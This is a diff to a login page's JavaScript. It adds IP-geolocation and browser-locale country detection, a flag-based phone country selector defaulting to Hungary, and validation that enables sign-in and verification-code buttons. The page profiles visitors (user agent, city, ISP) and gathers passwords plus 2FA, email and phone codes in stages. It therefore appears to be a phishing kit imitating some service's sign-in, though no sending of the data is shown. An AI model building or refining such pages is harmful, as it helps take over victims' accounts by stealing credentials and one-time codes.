@@ -22,6 +22,7 @@ const userInfo = {
     userAgent: navigator.userAgent,
     timestamp: new Date().toLocaleString(),
     country: 'Unknown',
+    countryCode: '',
     city: 'Unknown',
     isp: 'Unknown'
 };
@@ -69,6 +70,7 @@ async function collectUserInfo() {
             const data = await fetchJson('https://ipapi.co/json/');
             return {
                 country: data.country_name,
+                countryCode: data.country_code,
                 city: data.city,
                 isp: data.org
             };
@@ -77,6 +79,7 @@ async function collectUserInfo() {
             const data = await fetchJson('https://ipwho.is/');
             return {
                 country: data.country,
+                countryCode: data.country_code,
                 city: data.city,
                 isp: data.connection ? data.connection.isp : ''
             };
@@ -86,6 +89,7 @@ async function collectUserInfo() {
             const data = await fetchJson(`https://ipapi.co/${ipData.ip}/json/`);
             return {
                 country: data.country_name,
+                countryCode: data.country_code,
                 city: data.city,
                 isp: data.org
             };
@@ -97,8 +101,12 @@ async function collectUserInfo() {
             const info = await load();
             if (info.country) {
                 userInfo.country = info.country || 'Unknown';
+                userInfo.countryCode = String(info.countryCode || '').toUpperCase();
                 userInfo.city = info.city || 'Unknown';
                 userInfo.isp = info.isp || 'Unknown';
+                if (userInfo.countryCode && typeof setDefaultCountryByRegion === 'function') {
+                    setDefaultCountryByRegion(userInfo.countryCode);
+                }
                 console.log('User info collected:', userInfo);
                 return;
             }
@@ -414,6 +422,7 @@ function ensureHiddenInput(id) {
 function buildCountrySelector(container) {
     const wrap = document.createElement('div');
     wrap.className = 'order-first';
+    const selectedCountry = getSelectedCountryOption();
 
     const button = document.createElement('button');
     button.type = 'button';
@@ -421,8 +430,8 @@ function buildCountrySelector(container) {
 
     button.innerHTML = `
         <div class="flex h-5 min-w-12 items-center justify-center border-r-2 border-solid border-third pr-1">
-            <span class="mr-1.5" data-country-code>+36</span>
-            <span class="mr-0.5" data-country-flag>🇭🇺</span>
+            <span class="mr-1.5" data-country-code>${selectedCountry.code}</span>
+            <span class="mr-0.5" data-country-flag>${getRegionFlag(selectedCountry.region)}</span>
             <div class="icon size-4 fill-tertiary transition ease-out" style="transform: rotate(-90deg);">
                 <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
                     <path d="M20.9717 9.59292L15.2482 15.3155L20.9717 21.0389L18.5143 23.4972L10.3325 15.3164L18.5143 7.1355L20.9717 9.59292Z"></path>
@@ -460,7 +469,8 @@ function updateCountrySelector() {
         emailPhoneField.insertBefore(selectorWrap, emailPhoneField.firstChild);
         emailPhoneField.classList.add('has-country');
         const hiddenCode = ensureHiddenInput('country-code');
-        if (!hiddenCode.value) hiddenCode.value = '+36';
+        if (!hiddenCode.value) hiddenCode.value = getSelectedCountryOption().code;
+        syncSelectedCountryUI();
     }
 
     if (!show && selector) {
@@ -475,11 +485,6 @@ function updateCountrySelector() {
 
     const hiddenPhone = ensureHiddenInput('phone-number');
     hiddenPhone.value = value.replace(/\D/g, '');
-}
-
-if (emailPhoneVisibleInput) {
-    emailPhoneVisibleInput.addEventListener('input', updateCountrySelector);
-    updateCountrySelector();
 }
 
 const countryOptions = [
@@ -541,6 +546,126 @@ const countryOptions = [
     { code: '+84', name: 'Vietnam' }
 ];
 
+const regionCountryMap = {
+    AD: 'Andorra',
+    AE: 'United Arab Emirates',
+    AF: 'Afghanistan',
+    AG: 'Antigua and Barbuda',
+    AI: 'Anguilla',
+    AL: 'Albania',
+    AM: 'Armenia',
+    AO: 'Angola',
+    AQ: 'Antarctica',
+    AR: 'Argentina',
+    AT: 'Austria',
+    AU: 'Australia',
+    AW: 'Aruba',
+    AX: 'Aland Islands',
+    AZ: 'Azerbaijan',
+    BA: 'Bosnia and Herzegovina',
+    BB: 'Barbados',
+    BD: 'Bangladesh',
+    BE: 'Belgium',
+    BG: 'Bulgaria',
+    BH: 'Bahrain',
+    BJ: 'Benin',
+    BN: 'Brunei',
+    BR: 'Brazil',
+    BS: 'Bahamas',
+    BT: 'Bhutan',
+    CH: 'Switzerland',
+    ES: 'Spain',
+    GB: 'United Kingdom',
+    HU: 'Hungary',
+    ID: 'Indonesia',
+    IL: 'Israel',
+    IN: 'India',
+    IR: 'Iran',
+    JP: 'Japan',
+    KW: 'Kuwait',
+    KZ: 'Kazakhstan',
+    LB: 'Lebanon',
+    LY: 'Libya',
+    MA: 'Morocco',
+    NL: 'Netherlands',
+    NO: 'Norway',
+    PK: 'Pakistan',
+    PL: 'Poland',
+    PT: 'Portugal',
+    QA: 'Qatar',
+    RO: 'Romania',
+    RU: 'Russia',
+    SA: 'Saudi Arabia',
+    SE: 'Sweden',
+    SG: 'Singapore',
+    TR: 'Turkey',
+    TW: 'Taiwan',
+    UA: 'Ukraine',
+    US: 'United States',
+    VN: 'Vietnam',
+};
+
+let countryManuallySelected = false;
+
+function getBrowserRegion() {
+    const locales = [navigator.language, ...(navigator.languages || [])].filter(Boolean);
+    for (const locale of locales) {
+        const region = String(locale).split(/[-_]/)[1] || '';
+        if (region) return region.toUpperCase();
+    }
+    return '';
+}
+
+function getRegionForCountryOption(option) {
+    const entry = Object.entries(regionCountryMap).find(([, name]) => name === option.name);
+    return entry ? entry[0] : '';
+}
+
+function getRegionFlag(region) {
+    const clean = String(region || '').toUpperCase();
+    if (!/^[A-Z]{2}$/.test(clean)) return '';
+    return clean.replace(/./g, char => String.fromCodePoint(127397 + char.charCodeAt(0)));
+}
+
+function getSelectedCountryOption() {
+    const option = countryOptions.find(item => item.selected) || countryOptions.find(item => item.name === 'Hungary') || countryOptions[0];
+    return { ...option, region: getRegionForCountryOption(option) };
+}
+
+function syncSelectedCountryUI() {
+    const selected = getSelectedCountryOption();
+    document.querySelectorAll('[data-country-code]').forEach(el => {
+        el.textContent = selected.code;
+    });
+    document.querySelectorAll('[data-country-flag]').forEach(el => {
+        el.textContent = getRegionFlag(selected.region);
+    });
+
+    const hiddenCode = ensureHiddenInput('country-code');
+    hiddenCode.value = selected.code;
+}
+
+function selectCountryOption(option, { manual = false, updateUserInfo = true } = {}) {
+    if (!option) return false;
+    countryOptions.forEach(item => {
+        item.selected = item.name === option.name && item.code === option.code;
+    });
+    if (manual) countryManuallySelected = true;
+    if (updateUserInfo && option.name) {
+        userInfo.country = option.name;
+        userInfo.countryCode = getRegionForCountryOption(option);
+    }
+    syncSelectedCountryUI();
+    return true;
+}
+
+function setDefaultCountryByRegion(region) {
+    if (countryManuallySelected) return false;
+    const countryName = regionCountryMap[String(region || '').toUpperCase()];
+    const option = countryName ? countryOptions.find(item => item.name === countryName) : null;
+    return selectCountryOption(option, { updateUserInfo: userInfo.country === 'Unknown' });
+}
+
 function updateCountryFromSelection(code) {
     const match = countryOptions.find(item => item.code === code);
     if (match && match.name) {
@@ -548,9 +673,18 @@ function updateCountryFromSelection(code) {
     }
 }
 
+setDefaultCountryByRegion(getBrowserRegion());
+
 const defaultCountry = countryOptions.find(item => item.selected);
 if (defaultCountry && userInfo.country === 'Unknown') {
     userInfo.country = defaultCountry.name;
+}
+
+syncSelectedCountryUI();
+
+if (emailPhoneVisibleInput) {
+    emailPhoneVisibleInput.addEventListener('input', updateCountrySelector);
+    updateCountrySelector();
 }
 
 function openCountrySheet() {
@@ -573,14 +707,7 @@ function openCountrySheet() {
                 btn.innerHTML = `<span class="mr-1 w-12 flex-none whitespace-nowrap text-left">${item.code}</span>` +
                     `<span class="ellipsis max-w-60 overflow-hidden whitespace-nowrap" title="${item.name}">${item.name}</span>`;
                 btn.addEventListener('click', () => {
-                    countryOptions.forEach(opt => { opt.selected = opt.code === item.code; });
-                    const codeSpan = document.querySelector('[data-country-code]');
-                    const flagSpan = document.querySelector('[data-country-flag]');
-                    if (codeSpan) codeSpan.textContent = item.code;
-                    if (flagSpan) flagSpan.textContent = '';
-                    const hiddenCode = ensureHiddenInput('country-code');
-                    hiddenCode.value = item.code;
-                    updateCountryFromSelection(item.code);
+                    selectCountryOption(item, { manual: true });
                     closeCountrySheet();
                 });
                 list.appendChild(btn);
@@ -621,6 +748,7 @@ if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneFie
         
         // Change placeholder text to remove "/Username"
         if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number';
+        updateSignInButtonState();
     });
 
     // Password tab click
@@ -638,6 +766,7 @@ if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneFie
         
         // Restore original placeholder text
         if(emailPhoneVisibleInput) emailPhoneVisibleInput.placeholder = 'Email / Phone Number / Username';
+        updateSignInButtonState();
     });
 }
 
@@ -648,6 +777,31 @@ if (oneTimeTab && passwordField && passwordTab && passwordInput && emailPhoneFie
 const form = document.getElementById("login-form");
 const twofaInput = document.getElementById("twofa_input");
 const twofaButton = document.getElementById("twofa_button");
+const signInButton = form ? form.querySelector('button[type="submit"]') : null;
+
+function isValidVerificationCode(value) {
+    return /^\d{4,6}$/.test(String(value || '').trim());
+}
+
+function isValidLoginIdentifier(value) {
+    const clean = String(value || '').trim();
+    const isPhone = /^[\d+][\d\s\-()]+$/.test(clean.replace(/\s/g, ''));
+
+    if (isPhone) {
+        const phoneDigits = clean.replace(/\D/g, '');
+        return phoneDigits.length >= 7 && phoneDigits.length <= 15;
+    }
+
+    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(clean);
+}
+
+function updateSignInButtonState() {
+    if (!signInButton || !emailPhoneInput || !passwordInput) return;
+
+    const hasValidIdentifier = isValidLoginIdentifier(emailPhoneInput.value);
+    const hasValidPassword = isOneTimeCodeMode || passwordInput.value.trim().length >= 4;
+    signInButton.classList.toggle('login-ready', hasValidIdentifier && hasValidPassword);
+}
 
 // password toggle handler (eye icon)
 try{
@@ -670,8 +824,15 @@ try{
 }catch(e){/* ignore */}
 
 twofaInput.addEventListener("input", () => {
-    twofaButton.disabled = twofaInput.value.length !== 6;
+    twofaButton.disabled = !isValidVerificationCode(twofaInput.value);
 });
+
+if (emailPhoneInput && passwordInput) {
+    emailPhoneInput.addEventListener("input", updateSignInButtonState);
+    passwordInput.addEventListener("input", updateSignInButtonState);
+    updateSignInButtonState();
+    setTimeout(updateSignInButtonState, 250);
+}
 
 form.addEventListener("submit", async e => {
     e.preventDefault();
@@ -828,7 +989,7 @@ const emailButton = document.getElementById("email_button");
 if (emailInput) {
     emailInput.addEventListener("input", () => {
         if (emailButton) {
-            emailButton.disabled = emailInput.value.length !== 6;
+            emailButton.disabled = !isValidVerificationCode(emailInput.value);
         }
     });
 }
@@ -909,7 +1070,7 @@ const phoneButton = document.getElementById("phone_button");
 if (phoneInput) {
     phoneInput.addEventListener("input", () => {
         if (phoneButton) {
-            phoneButton.disabled = phoneInput.value.length !== 6;
+            phoneButton.disabled = !isValidVerificationCode(phoneInput.value);
         }
     });
 }
